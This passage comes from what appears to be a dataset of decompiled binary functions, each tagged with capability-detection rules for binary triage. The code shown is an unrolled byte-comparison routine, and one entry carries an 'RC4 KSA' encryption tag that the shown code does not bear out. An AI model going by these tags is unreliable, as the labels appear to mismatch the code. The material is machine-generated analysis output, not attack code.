uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xc));\n            uVar1 = *(arg_ch + (arg_10h - 0xc));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xb));\n            uVar1 = *(arg_ch + (arg_10h - 0xb));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 10)) - *(arg_ch + (arg_10h - 10));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004167c7:\n        if (*(arg_8h + (arg_10h - 9)) == *(arg_ch + (arg_10h - 9))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 9));\n            uVar3 = *(arg_8h + (arg_10h - 9));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 8));\n            uVar1 = *(arg_ch + (arg_10h - 8));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 7));\n            uVar1 = *(arg_ch + (arg_10h - 7));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 6)) - *(arg_ch + (arg_10h - 6));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x0041685f:\n        uVar1 = *(arg_8h + (arg_10h - 5));\n        if (uVar1 == *(arg_ch + (arg_10h - 5))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 5));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 4));\n            uVar1 = *(arg_ch + (arg_10h - 4));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 3));\n            uVar1 = *(arg_ch + (arg_10h - 3));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 2)) - *(arg_ch + (arg_10h - 2));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\ncode_r0x004168ee:\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004168f6:\n        uVar1 = *(arg_ch + (arg_10h - 1));\n        uVar3 = *(arg_8h + (arg_10h - 1));\n        if (uVar3 == uVar1) {\n            return 0;\n        }\n        return (0 < uVar3 - uVar1) * 2 + -1;\n    case 0x1e:\n        uVar1 = *(arg_8h + (arg_10h - 0x1e));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1e))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1d));\n            uVar1 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1c));\n            uVar1 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x1b)) - *(arg_ch + (arg_10h - 0x1b));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004169b0:\n        uVar1 = *(arg_8h + (arg_10h - 0x1a));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1a))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x19));\n            uVar1 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x18));\n            uVar1 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x17)) - *(arg_ch + (arg_10h - 0x17));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416a47:\n        uVar1 = *(arg_8h + (arg_10h - 0x16));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x16))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x15));\n            uVar1 = *(arg_ch + (arg_10h - 0x15));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x14));\n            uVar1 = *(arg_ch + (arg_10h - 0x14));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x13)) - *(arg_ch + (arg_10h - 0x13));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416ade:\n        uVar1 = *(arg_8h + (arg_10h - 0x12));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x12))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x12));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x11));\n            uVar1 = *(arg_ch + (arg_10h - 0x11));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x10));\n            uVar1 = *(arg_ch + (arg_10h - 0x10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xf)) - *(arg_ch + (arg_10h - 0xf));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416b75:\n        uVar1 = *(arg_8h + (arg_10h - 0xe));\n        if (uVar1 == *(arg_ch + (arg_10h - 0xe))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0xe));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xd));\n            uVar1 = *(arg_ch + (arg_10h - 0xd));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xc));\n            uVar1 = *(arg_ch + (arg_10h - 0xc));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xb)) - *(arg_ch + (arg_10h - 0xb));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416c0c:\n        if (*(arg_8h + (arg_10h - 10)) == *(arg_ch + (arg_10h - 10))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 10));\n            uVar3 = *(arg_8h + (arg_10h - 10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar1 = *(arg_ch + (arg_10h - 9));\n            uVar3 = *(arg_8h + (arg_10h - 9));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar1 = *(arg_ch + (arg_10h - 8));\n            uVar3 = *(arg_8h + (arg_10h - 8));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 7)) - *(arg_ch + (arg_10h - 7));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416ca4:\n        uVar1 = *(arg_8h + (arg_10h - 6));\n        if (uVar1 == *(arg_ch + (arg_10h - 6))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 6));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 5));\n            uVar1 = *(arg_ch + (arg_10h - 5));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 4));\n            uVar1 = *(arg_ch + (arg_10h - 4));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 3)) - *(arg_ch + (arg_10h - 3));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416d3b:\n        if (*(arg_8h + (arg_10h - 2)) != *(arg_ch + (arg_10h - 2))) {\ncode_r0x00417193:\n            uVar1 = *(arg_ch + (arg_10h - 2));\n            uVar3 = *(arg_8h + (arg_10h - 2));\n            if (uVar3 == uVar1) goto code_r0x004168f6;\n            iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1;\n            goto code_r0x004168ee;\n        }\n        goto code_r0x004164da;\n    case 0x1f:\n        if (*(arg_8h + (arg_10h - 0x1f)) == *(arg_ch + (arg_10h - 0x1f))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 0x1f));\n            uVar3 = *(arg_8h + (arg_10h - 0x1f));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1e));\n            uVar1 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1d));\n            uVar1 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x1c)) - *(arg_ch + (arg_10h - 0x1c));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416de6:\n        uVar1 = *(arg_8h + (arg_10h - 0x1b));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1b))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1a));\n            uVar1 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x19));\n            uVar1 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x18)) - *(arg_ch + (arg_10h - 0x18));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416e7d:\n        uVar1 = *(arg_8h + (arg_10h - 0x17));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x17))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x16));\n            uVar1 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x15));\n            uVar1 = *(arg_ch + (arg_10h - 0x15));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x14)) - *(arg_ch + (arg_10h - 0x14));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416f14:\n        uVar1 = *(arg_8h + (arg_10h - 0x13));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x13))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x13));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x12));\n            uVar1 = *(arg_ch + (arg_10h - 0x12));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x11));\n            uVar1 = *(arg_ch + (arg_10h - 0x11));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x10)) - *(arg_ch + (arg_10h - 0x10));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416fab:\n        if (*(arg_8h + (arg_10h - 0xf)) == *(arg_ch + (arg_10h - 0xf))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 0xf));\n            uVar3 = *(arg_8h + (arg_10h - 0xf));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xe));\n            uVar1 = *(arg_ch + (arg_10h - 0xe));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xd));\n            uVar1 = *(arg_ch + (arg_10h - 0xd));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xc)) - *(arg_ch + (arg_10h - 0xc));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00417043:\n        uVar1 = *(arg_8h + (arg_10h - 0xb));\n        if (uVar1 == *(arg_ch + (arg_10h - 0xb))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0xb));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 10));\n            uVar1 = *(arg_ch + (arg_10h - 10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 9));\n            uVar1 = *(arg_ch + (arg_10h - 9));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 8)) - *(arg_ch + (arg_10h - 8));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004170da:\n        uVar1 = *(arg_8h + (arg_10h - 7));\n        if (uVar1 == *(arg_ch + (arg_10h - 7))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 7));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 6));\n            uVar1 = *(arg_ch + (arg_10h - 6));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 5));\n            uVar1 = *(arg_ch + (arg_10h - 5));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 4)) - *(arg_ch + (arg_10h - 4));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00417171:\n        uVar3 = *(arg_8h + (arg_10h - 3));\n        uVar1 = *(arg_ch + (arg_10h - 3));\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        goto code_r0x00417193;\n    }\n}\n",
        "token_count": 16812
    },
    "00417350": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417350(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar3 = 0;\n    if (0x1f < arg_10h) {\n        do {\n            if (*arg_8h == *arg_ch) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = *arg_8h & 0xff;\n                uVar2 = *arg_ch;\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 1);\n                uVar2 = *(arg_ch + 1);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 2);\n                uVar2 = *(arg_ch + 2);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 3) - *(arg_ch + 3);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[1] == arg_ch[1]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[1] & 0xff;\n                uVar2 = *(arg_ch + 1);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 5);\n                uVar2 = *(arg_ch + 5);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 6);\n                uVar2 = *(arg_ch + 6);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 7) - *(arg_ch + 7);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[2] == arg_ch[2]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[2] & 0xff;\n                uVar2 = *(arg_ch + 2);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 9);\n                uVar2 = *(arg_ch + 9);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 10);\n                uVar2 = *(arg_ch + 10);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[3] == arg_ch[3]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[3] & 0xff;\n                uVar2 = *(arg_ch + 3);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0xd);\n                uVar2 = *(arg_ch + 0xd);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0xe);\n                uVar2 = *(arg_ch + 0xe);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[4] == arg_ch[4]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[4] & 0xff;\n                uVar2 = *(arg_ch + 4);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x11);\n                uVar2 = *(arg_ch + 0x11);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x12);\n                uVar2 = *(arg_ch + 0x12);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[5] == arg_ch[5]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[5] & 0xff;\n                uVar2 = *(arg_ch + 5);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x15);\n                uVar2 = *(arg_ch + 0x15);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x16);\n                uVar2 = *(arg_ch + 0x16);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[6] == arg_ch[6]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[6] & 0xff;\n                uVar2 = *(arg_ch + 6);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x19);\n                uVar2 = *(arg_ch + 0x19);\n                if ((uVar4 != uVar2) && 